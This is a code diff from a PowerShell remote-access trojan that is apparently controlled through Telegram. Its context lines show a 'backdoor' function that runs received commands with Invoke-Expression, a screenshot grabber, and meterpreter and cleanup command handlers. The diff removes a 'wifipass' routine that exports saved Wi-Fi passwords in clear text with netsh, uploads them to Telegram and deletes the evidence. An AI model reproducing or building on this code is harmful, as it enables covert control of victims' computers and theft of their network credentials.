@@ -72,23 +72,6 @@ function backdoor {
         Invoke-Expression -Command:$command
 }
 
-function wifipass {
-    Send-Message "Getting_Passwords.."
-    [system.io.directory]::CreateDirectory(“C:\Temp\test”)
-
-    # Passwords via powershell
-    $passwords = netsh wlan export profile folder=C:\Temp\test key=clear
-    $uploadPath = "C:\Temp\test"
-
-    # Downloading test file to telegram
-    download $uploadPath
-    Start-Sleep -Seconds 5
-
-    # Deletes the file
-    Send-Message "Deleting_Passwords.."
-    Remove-Item $uploadPath -Force -Recurse
-}
-
 function screenshot {
       [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
         function screenshot([Drawing.Rectangle]$bounds, $path) {
@@ -703,9 +686,6 @@ While ($DoNotExit)  {
       }
       "/meterpreter $ipV4"  {
          
-      }
-      "/wifipass $ipV4" {
-        wifipass
       }
       "/cleanAll $ipV4" {
         cleanAll
